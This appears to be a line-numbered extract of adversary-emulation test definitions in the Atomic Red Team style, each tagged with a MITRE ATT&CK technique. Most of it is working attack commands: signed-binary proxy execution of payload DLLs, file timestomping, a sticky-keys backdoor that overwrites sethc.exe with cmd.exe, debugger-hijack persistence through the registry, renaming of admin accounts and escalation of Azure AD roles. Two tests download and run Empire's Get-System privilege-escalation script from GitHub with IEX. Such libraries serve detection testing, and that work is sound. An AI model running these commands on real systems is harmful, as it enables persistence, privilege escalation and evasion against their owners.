3999: [- name: Register-CimProvider - Execute evil dll] [attack_technique: T1218] [      C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}]
4002: [- name: InfDefaultInstall.exe .inf Execution] [attack_technique: T1218] [    command: |]
4003: [- name: InfDefaultInstall.exe .inf Execution] [attack_technique: T1218] [      InfDefaultInstall.exe #{inf_to_execute}]
4006: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [    command: |]
4007: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [      FOR /F "tokens=2*" %a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe" /V PATH') do set microsoft_wordpath=%b]
4008: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [      call "%microsoft_wordpath%\protocolhandler.exe" "ms-word:nft|u|#{remote_url}"]
4009: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [  auto_generated_guid: 7cbb0f26-a4c1-4f77-b180-a009aa05637e]
4010: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [    Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe]
4011: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [  supported_platforms:]
4012: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [    - windows]
4013: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [  input_arguments:]
4014: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [    xml_payload:]
4015: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [      type: Path]
4016: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [      default: PathToAtomicsFolder\T1218\src\T1218.xml]
4017: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [    mwcpath:]
4018: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [      type: Path]
4019: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [      default: C:\Windows\Microsoft.NET\Framework64\v4.0.30319]
4020: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [    mwcname:]
4021: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [      type: Path]
4022: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [      default: microsoft.workflow.compiler.exe]
4023: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [  dependency_executor_name: powershell ]
4024: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [  dependencies: ]
4025: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [    - description: |]
4026: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [        .Net must be installed for this test to work correctly.]
4027: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [      prereq_command: | ]
4028: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [        if (Test-Path #{mwcpath}\#{mwcname} ) {exit 0} else {exit 1}]
4029: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [      get_prereq_command: | ]
4030: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [        write-host ".Net must be installed for this test to work correctly."]
4031: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [  executor:]
4032: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [    command: |]
4033: [- name: Microsoft.Workflow.Compiler.exe Payload Execution] [attack_technique: T1218] [      #{mwcpath}\#{mwcname} "#{xml_payload}" output.txt]
4036: [- name: Renamed Microsoft.Workflow.Compiler.exe Payload Executions] [attack_technique: T1218] [    command: |]
4037: [- name: Renamed Microsoft.Workflow.Compiler.exe Payload Executions] [attack_technique: T1218] [      #{renamed_binary} #{xml_payload} output.txt]
4040: [- name: DiskShadow Command Execution] [attack_technique: T1218] [    command: |]
4041: [- name: DiskShadow Command Execution] [attack_technique: T1218] [      #{dspath} -S #{txt_payload} ]
4044: [- name: Load Arbitrary DLL via Wuauclt (Windows Update Client)] [attack_technique: T1218] [    command: |]
4045: [- name: Load Arbitrary DLL via Wuauclt (Windows Update Client)] [attack_technique: T1218] [      wuauclt.exe /UpdateDeploymentProvider #{arbitrary_dll} /RunHandlerComServer]
4050: [- name: Lolbin Gpscript logon option] [attack_technique: T1218] [    command: |]
4051: [- name: Lolbin Gpscript logon option] [attack_technique: T1218] [      Gpscript /logon]
4054: [- name: Lolbin Gpscript startup option] [attack_technique: T1218] [    command: |]
4055: [- name: Lolbin Gpscript startup option] [attack_technique: T1218] [      Gpscript /startup]
4058: [- name: Lolbas ie4uinit.exe use as proxy] [attack_technique: T1218] [    command: |]
4059: [- name: Lolbas ie4uinit.exe use as proxy] [attack_technique: T1218] [      copy #{Path_ie4uinit} %TEMP%\ie4uinit.exe]
4060: [- name: Lolbas ie4uinit.exe use as proxy] [attack_technique: T1218] [      copy #{Path_inf} %TEMP%\ieuinit.inf]
4061: [- name: Lolbas ie4uinit.exe use as proxy] [attack_technique: T1218] [      %TEMP%\ie4uinit.exe -BaseSettings]
4067: [- name: SyncAppvPublishingServer Signed Script PowerShell Command Execution] [attack_technique: T1216] [    command: |]
4068: [- name: SyncAppvPublishingServer Signed Script PowerShell Command Execution] [attack_technique: T1216] [      C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}"]
4071: [- name: manage-bde.wsf Signed Script Command Execution] [attack_technique: T1216] [    command: |]
4072: [- name: manage-bde.wsf Signed Script Command Execution] [attack_technique: T1216] [      set comspec=#{command_to_execute}]
4073: [- name: manage-bde.wsf Signed Script Command Execution] [attack_technique: T1216] [      cscript %windir%\System32\manage-bde.wsf]
4094: [- name: WINWORD Remote Template Injection] [attack_technique: T1221] [    command: |]
4095: [- name: WINWORD Remote Template Injection] [attack_technique: T1221] [      start #{docx_file}]
4098: [- name: Windows - Modify file creation timestamp with PowerShell] [attack_technique: T1070.006] [    command: |]
4099: [- name: Windows - Modify file creation timestamp with PowerShell] [attack_technique: T1070.006] [      Get-ChildItem #{file_path} | % { $_.CreationTime = "#{target_date_time}" }]
4104: [- name: Windows - Modify file last modified timestamp with PowerShell] [attack_technique: T1070.006] [    command: |]
4105: [- name: Windows - Modify file last modified timestamp with PowerShell] [attack_technique: T1070.006] [      Get-ChildItem #{file_path} | % { $_.LastWriteTime = "#{target_date_time}" }]
4110: [- name: Windows - Modify file last access timestamp with PowerShell] [attack_technique: T1070.006] [    command: |]
4111: [- name: Windows - Modify file last access timestamp with PowerShell] [attack_technique: T1070.006] [      Get-ChildItem #{file_path} | % { $_.LastAccessTime = "#{target_date_time}" }]
4116: [- name: Windows - Timestomp a File] [attack_technique: T1070.006] [    command: |]
4117: [- name: Windows - Timestomp a File] [attack_technique: T1070.006] [      import-module #{file_path}\timestomp.ps1]
4118: [- name: Windows - Timestomp a File] [attack_technique: T1070.006] [      timestomp -dest "#{file_path}\kxwn.lock"]
4124: [- name: Named pipe client impersonation] [attack_technique: T1134.001] [    command: |]
4125: [- name: Named pipe client impersonation] [attack_technique: T1134.001] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
4126: [- name: Named pipe client impersonation] [attack_technique: T1134.001] [      IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose]
4129: [- name: '`SeDebugPrivilege` token duplication'] [attack_technique: T1134.001] [    command: |]
4130: [- name: '`SeDebugPrivilege` token duplication'] [attack_technique: T1134.001] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
4131: [- name: '`SeDebugPrivilege` token duplication'] [attack_technique: T1134.001] [      IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose]
4134: [- name: Lolbin Jsc.exe compile javascript to exe] [attack_technique: T1127] [    command: |]
4135: [- name: Lolbin Jsc.exe compile javascript to exe] [attack_technique: T1127] [      copy #{filename} %TEMP%\hello.js]
4136: [- name: Lolbin Jsc.exe compile javascript to exe] [attack_technique: T1127] [      #{jscpath}\#{jscname} %TEMP%\hello.js]
4142: [- name: Lolbin Jsc.exe compile javascript to dll] [attack_technique: T1127] [    command: |]
4143: [- name: Lolbin Jsc.exe compile javascript to dll] [attack_technique: T1127] [      copy #{filename} %TEMP%\LibHello.js]
4144: [- name: Lolbin Jsc.exe compile javascript to dll] [attack_technique: T1127] [      #{jscpath}\#{jscname} /t:library %TEMP%\LibHello.js]
4150: [- name: Take ownership using takeown utility] [attack_technique: T1222.001] [    command: |]
4151: [- name: Take ownership using takeown utility] [attack_technique: T1222.001] [      takeown.exe /f #{file_folder_to_own} /r]
4154: [- name: cacls - Grant permission to specified user or group recursively] [attack_technique: T1222.001] [    command: |]
4155: [- name: cacls - Grant permission to specified user or group recursively] [attack_technique: T1222.001] [      icacls.exe #{file_or_folder} /grant #{user_or_group}:F]
4158: [- name: attrib - Remove read-only attribute] [attack_technique: T1222.001] [    command: |]
4159: [- name: attrib - Remove read-only attribute] [attack_technique: T1222.001] [      attrib.exe -r #{file_or_folder}\*.* /s]
4162: [- name: attrib - hide file] [attack_technique: T1222.001] [    command: |]
4163: [- name: attrib - hide file] [attack_technique: T1222.001] [      mkdir #{file_or_folder} >nul 2>&1]
4164: [- name: attrib - hide file] [attack_technique: T1222.001] [      echo T1222.001_attrib1 >> #{file_or_folder}\T1222.001_attrib1.txt]
4165: [- name: attrib - hide file] [attack_technique: T1222.001] [      echo T1222.001_attrib2 >> #{file_or_folder}\T1222.001_attrib2.txt]
4166: [- name: attrib - hide file] [attack_technique: T1222.001] [      attrib.exe +h #{file_or_folder}\T1222.001_attrib1.txt]
4167: [- name: attrib - hide file] [attack_technique: T1222.001] [      attrib.exe +h #{file_or_folder}\T1222.001_attrib2.txt]
4172: [- name: MSXSL Bypass using local files] [attack_technique: T1220] [    command: |]
4173: [- name: MSXSL Bypass using local files] [attack_technique: T1220] [      #{msxsl_exe} #{xmlfile} #{xslfile}]
4178: [- name: MSXSL Bypass using remote files] [attack_technique: T1220] [    command: |]
4179: [- name: MSXSL Bypass using remote files] [attack_technique: T1220] [      #{msxsl_exe} #{xmlfile} #{xslfile}]
4184: [- name: WMIC bypass using local XSL file] [attack_technique: T1220] [    command: |]
4185: [- name: WMIC bypass using local XSL file] [attack_technique: T1220] [      wmic #{wmic_command} /FORMAT:"#{local_xsl_file}"]
4188: [- name: WMIC bypass using remote XSL file] [attack_technique: T1220] [    command: |]
4189: [- name: WMIC bypass using remote XSL file] [attack_technique: T1220] [      wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"]
4192: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [    command: |]
4193: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [      $input_table = "#{parent_list}".split(",")]
4194: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [      $Name = "Debugger"]
4195: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [      $Value = "#{attached_process}"]
4196: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [      Foreach ($item in $input_table){]
4197: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        $item = $item.trim()]
4198: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"]
4199: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        IF(!(Test-Path $registryPath))]
4200: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        {]
4201: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [          New-Item -Path $registryPath -Force]
4202: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [          New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force]
4203: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        }]
4204: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        ELSE]
4205: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        {]
4206: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [          New-ItemProperty -Path $registryPath -Name $name -Value $Value]
4207: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [        }]
4208: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [      }]
4218: [- name: Replace binary of sticky keys] [attack_technique: T1546.008] [    command: |]
4219: [- name: Replace binary of sticky keys] [attack_technique: T1546.008] [      copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe]
4220: [- name: Replace binary of sticky keys] [attack_technique: T1546.008] [      takeown /F C:\Windows\System32\sethc.exe /A]
4221: [- name: Replace binary of sticky keys] [attack_technique: T1546.008] [      icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t]
4222: [- name: Replace binary of sticky keys] [attack_technique: T1546.008] [      copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe]
4227: [- name: Admin Account Manipulate] [attack_technique: T1098] [    command: |]
4228: [- name: Admin Account Manipulate] [attack_technique: T1098] [      $x = Get-Random -Minimum 2 -Maximum 9999]
4229: [- name: Admin Account Manipulate] [attack_technique: T1098] [      $y = Get-Random -Minimum 2 -Maximum 9999]
4230: [- name: Admin Account Manipulate] [attack_technique: T1098] [      $z = Get-Random -Minimum 2 -Maximum 9999]
4231: [- name: Admin Account Manipulate] [attack_technique: T1098] [      $w = Get-Random -Minimum 2 -Maximum 9999]
4232: [- name: Admin Account Manipulate] [attack_technique: T1098] [      Write-Host HaHa_$x$y$z]
4233: [- name: Admin Account Manipulate] [attack_technique: T1098] []
4234: [- name: Admin Account Manipulate] [attack_technique: T1098] [      $fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match "User" -and $_.PrincipalSource -match "Local"} | Select Name]
4235: [- name: Admin Account Manipulate] [attack_technique: T1098] []
4236: [- name: Admin Account Manipulate] [attack_technique: T1098] [      foreach($member in $fmm) {]
4237: [- name: Admin Account Manipulate] [attack_technique: T1098] [          if($member -like "*Administrator*") {]
4238: [- name: Admin Account Manipulate] [attack_technique: T1098] [              $account = $member.Name -replace ".+\\\","" # strip computername\]
4239: [- name: Admin Account Manipulate] [attack_technique: T1098] [              $originalDescription = (Get-LocalUser -Name $account).Description]
4240: [- name: Admin Account Manipulate] [attack_technique: T1098] [              Set-LocalUser -Name $account -Description "atr:$account;$originalDescription".Substring(0,48) # Keep original name in description]
4241: [- name: Admin Account Manipulate] [attack_technique: T1098] [              Rename-LocalUser -Name $account -NewName "HaHa_$x$y$z" # Required due to length limitation]
4242: [- name: Admin Account Manipulate] [attack_technique: T1098] [              Write-Host "Successfully Renamed $account Account on " $Env:COMPUTERNAME]
4243: [- name: Admin Account Manipulate] [attack_technique: T1098] [              }]
4244: [- name: Admin Account Manipulate] [attack_technique: T1098] [          }]
4255: [- name: Domain Account and Group Manipulate] [attack_technique: T1098] [    command: |]
4256: [- name: Domain Account and Group Manipulate] [attack_technique: T1098] [      $x = Get-Random -Minimum 2 -Maximum 99]
4257: [- name: Domain Account and Group Manipulate] [attack_technique: T1098] [      $y = Get-Random -Minimum 2 -Maximum 99]
4258: [- name: Domain Account and Group Manipulate] [attack_technique: T1098] [      $z = Get-Random -Minimum 2 -Maximum 99]
4259: [- name: Domain Account and Group Manipulate] [attack_technique: T1098] [      $w = Get-Random -Minimum 2 -Maximum 99]
4260: [- name: Domain Account and Group Manipulate] [attack_technique: T1098] []
4261: [- name: Domain Account and Group Manipulate] [attack_technique: T1098] [      Import-Module ActiveDirectory]
4262: [- name: Domain Account and Group Manipulate] [attack_technique: T1098] [      $account = "#{account_prefix}-$x$y$z"]
4263: [- name: Domain Account and Group Manipulate] [attack_technique: T1098] [      New-ADUser -Name $account -GivenName "Test" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}]
4264: [- name: Domain Account and Group Manipulate] [attack_technique: T1098] [      Add-ADGroupMember "#{group}" $account]
4269: [- name: Azure - adding user to Azure AD role] [attack_technique: T1098] [    command: |]
4270: [- name: Azure - adding user to Azure AD role] [attack_technique: T1098] [      Import-Module -Name AzureAD]
4271: [- name: Azure - adding user to Azure AD role] [attack_technique: T1098] [      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force]
4272: [- name: Azure - adding user to Azure AD role] [attack_technique: T1098] [      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword]
4273: [- name: Azure - adding user to Azure AD role] [attack_technique: T1098] [      Connect-AzureAD -Credential $Credential]
4274: [- name: Azure - adding user to Azure AD role] [attack_technique: T1098] []
4275: [- name: Azure - adding user to Azure AD role] [attack_technique: T1098] [      $user = Get-AzureADUser | where-object {$_.DisplayName -eq "#{user_principal_name}"}]
4276: [- name: Azure - adding user to Azure AD role] [attack_technique: T1098] [      if ($user -eq $null) { Write-Warning "User not found"; exit }]
4277: [- name: Azure - adding user to Azure AD role] [attack_technique: T1098] [      $role = Get-AzureADDirectoryRole | where-object {$_.DisplayName -eq "#{role_name}"}]
4278: [- name: Azure - adding user to Azure AD role] [attack_technique: T1098] [      if ($role -eq $null) { Write-Warning "Role not found"; exit }]
4279: [- name: Azure - adding user to Azure AD role] [attack_technique: T1098] [      Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId]
4280: [- name: Azure - adding user to Azure AD role] [attack_technique: T1098] [      Write-Host "User $($user.DisplayName) was added to $($role.DisplayName) role"]
4296: [- name: Azure - adding service principal to Azure AD role] [attack_technique: T1098] [    command: |]
4297: [- name: Azure - adding service principal to Azure AD role] [attack_technique: T1098] [      Import-Module -Name AzureAD]
4298: [- name: Azure - adding service principal to Azure AD role] [attack_technique: T1098] [      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force]
4299: [- name: Azure - adding service principal to Azure AD role] [attack_technique: T1098] [      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword]
4300: [- name: Azure - adding service principal to Azure AD role] [attack_technique: T1098] [      Connect-AzureAD -Credential $Credential]
4301: [- name: Azure - adding service principal to Azure AD role] [attack_technique: T1098] []
4302: [- name: Azure - adding service principal to Azure AD role] [attack_technique: T1098] [      $sp = Get-AzureADServicePrincipal | where-object {$_.DisplayName -eq "#{service_principal_name}"}]
4303: [- name: Azure - adding service principal to Azure AD role] [attack_technique: T1098] [      if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }]
4304: [- name: Azure - adding service principal to Azure AD role] [attack_technique: T1098] [      $role = Get-AzureADDirectoryRole | where-object {$_.DisplayName -eq "#{role_name}"}]
4305: [- name: Azure - adding service principal to Azure AD role] [attack_technique: T1098] [      if ($role -eq $null) { Write-Warning "Role not found"; exit }]
4306: [- name: Azure - adding service principal to Azure AD role] [attack_technique: T1098] [      Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId]
4307: [- name: Azure - adding service principal to Azure AD role] [attack_technique: T1098] [      Write-Host "Service Principal $($sp.DisplayName) was added to $($role.DisplayName)"]
4323: [- name: Azure - adding user to Azure role in subscription] [attack_technique: T1098] [    command: |]
4324: [- name: Azure - adding user to Azure role in subscription] [attack_technique: T1098] [      Import-Module -Name Az.Resources]
4325: [- name: Azure - adding user to Azure role in subscription] [attack_technique: T1098] [      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force]
4326: [- name: Azure - adding user to Azure role in subscription] [attack_technique: T1098] [      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword]
4327: [- name: Azure - adding user to Azure role in subscription] [attack_technique: T1098] [      Connect-AzAccount -Credential $Credential]
4328: [- name: Azure - adding user to Azure role in subscription] [attack_technique: T1098] []
4329: [- name: Azure - adding user to Azure role in subscription] [attack_technique: T1098] [      $user = Get-AzADUser | where-object {$_.DisplayName -eq "#{user_principal_name}"}]
4330: [- name: Azure - adding user to Azure role in subscription] [attack_technique: T1098] [      if ($user -eq $null) { Write-Warning "User not found"; exit }]
4331: [- name: Azure - adding user to Azure role in subscription] [attack_technique: T1098] [      $subscription = Get-AzSubscription | where-object {$_.Name -eq "#{subscription}"}]
4332: [- name: Azure - adding user to Azure role in subscription] [attack_technique: T1098] [      if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }]
4333: [- name: Azure - adding user to Azure role in subscription] [attack_technique: T1098] [      $role = Get-AzRoleDefinition | where-object {$_.Name -eq "#{role_name}"}]
4334: [- name: Azure - adding user to Azure role in subscription] [attack_technique: T1098] [      if ($role -eq $null) { Write-Warning "Role not found"; exit }]
4335: [- name: Azure - adding user to Azure role in subscription] [attack_technique: T1098] []
4336: [- name: Azure - adding user to Azure role in subscription] [attack_technique: T1098] [      New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription]
4337: [- name: Azure - adding user to Azure role in subscription] [attack_technique: T1098] [      Write-Host "User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)"]
4355: [- name: Azure - adding service principal to Azure role in subscription] [attack_technique: T1098] [    command: |]
4356: [- name: Azure - adding service principal to Azure role in subscription] [attack_technique: T1098] [      Import-Module -Name Az.Resources]
4357: [- name: Azure - adding service principal to Azure role in subscription] [attack_technique: T1098] [      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force]
4358: [- name: Azure - adding service principal to Azure role in subscription] [attack_technique: T1098] [      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword]
4359: [- name: Azure - adding service principal to Azure role in subscription] [attack_technique: T1098] [      Connect-AzAccount -Credential $Credential]
4360: [- name: Azure - adding service principal to Azure role in subscription] [attack_technique: T1098] []
4361: [- name: Azure - adding service principal to Azure role in subscription] [attack_technique: T1098] [      $sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq "#{service_principal_name}"}]
4362: [- name: Azure - adding service principal to Azure role in subscription] [attack_technique: T1098] [      if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }]
4363: [- name: Azure - adding service principal to Azure role in subscription] [attack_technique: T1098] [      $subscription = Get-AzSubscription | where-object {$_.Name -eq "#{subscription}"} ]
4364: [- name: Azure - adding service principal to Azure role in subscription] [attack_technique: T1098] [      if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }]
4365: [- name: Azure - adding service principal to Azure role in subscription] [attack_technique: T1098] [      $role = Get-AzRoleDefinition | where-object {$_.Name -eq "#{role_name}"}]
4366: [- name: Azure - adding service principal to Azure role in subscription] [attack_technique: T1098] [      if ($role -eq $null) { Write-Warning "Role not found"; exit }]
4367: [- name: Azure - adding service principal to Azure role in subscription] [attack_technique: T1098] []
4368: [- name: Azure - adding service principal to Azure role in subscription] [attack_technique: T1098] [      New-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription]
4369: [- name: Azure - adding service principal to Azure role in subscription] [attack_technique: T1098] [      Write-Host "Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)"]
4387: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [    command: |]
4388: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      Import-Module -Name AzureAD]
4389: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force]
4390: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword]
4391: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      Connect-AzureAD -Credential $Credential]
4392: [- name: AzureAD - adding permission to application] [attack_technique: T1098] []
4393: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $aadApplication = New-AzureADApplication -DisplayName "#{application_name}"]
4394: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId]
4395: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      #$aadApplication = Get-AzureADApplication | Where-Object {$_.DisplayName -eq "#{application_name}"}]
4396: [- name: AzureAD - adding permission to application] [attack_technique: T1098] []
4397: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      #Get Service Principal of Microsoft Graph Resource API ]
4398: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $graphSP =  Get-AzureADServicePrincipal -All $true | Where-Object {$_.DisplayName -eq "Microsoft Graph"}]
4399: [- name: AzureAD - adding permission to application] [attack_technique: T1098] []
4400: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      #Initialize RequiredResourceAccess for Microsoft Graph Resource API ]
4401: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess]
4402: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $requiredGraphAccess.ResourceAppId = $graphSP.AppId]
4403: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]]
4404: [- name: AzureAD - adding permission to application] [attack_technique: T1098] []
4405: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      #Set Application Permissions]
4406: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $ApplicationPermissions = @('#{application_permission}')]
4407: [- name: AzureAD - adding permission to application] [attack_technique: T1098] []
4408: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}]
4409: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      if($reqPermission)]
4410: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      {]
4411: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess]
4412: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $resourceAccess.Type = "Role"]
4413: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $resourceAccess.Id = $reqPermission.Id    ]
4414: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      #Add required app permission]
4415: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $requiredGraphAccess.ResourceAccess.Add($resourceAccess)]
4416: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      }]
4417: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      else]
4418: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      {]
4419: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      Write-Host "App permission $permission not found in the Graph Resource API" -ForegroundColor Red]
4420: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      }]
4421: [- name: AzureAD - adding permission to application] [attack_technique: T1098] []
4422: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      #Add required resource accesses]
4423: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]]
4424: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $requiredResourcesAccess.Add($requiredGraphAccess)]
4425: [- name: AzureAD - adding permission to application] [attack_technique: T1098] []
4426: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      #Set permissions in existing Azure AD App]
4427: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      Set-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess]
4428: [- name: AzureAD - adding permission to application] [attack_technique: T1098] []
4429: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      $servicePrincipal = Get-AzureADServicePrincipal -All $true | Where-Object {$_.AppId -eq $aadApplication.AppId}]
4430: [- name: AzureAD - adding permission to application] [attack_technique: T1098] []
4431: [- name: AzureAD - adding permission to application] [attack_technique: T1098] [      New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id]
4432: [- name: AzureAD - adding permission to application] [attack_technique: T1098] []
4444: [- name: Install AppInit Shim] [attack_technique: T1546.010] [    command: |]
4445: [- name: Install AppInit Shim] [attack_technique: T1546.010] [      reg.exe import #{registry_file}]
4450: [- name: Application Shim Installation] [attack_technique: T1546.011] [    command: |]
4451: [- name: Application Shim Installation] [attack_technique: T1546.011] [      sdbinst.exe #{file_path}]
4456: [- name: New shim database files created in the default shim database directory] [attack_technique: T1546.011] [    command: |]
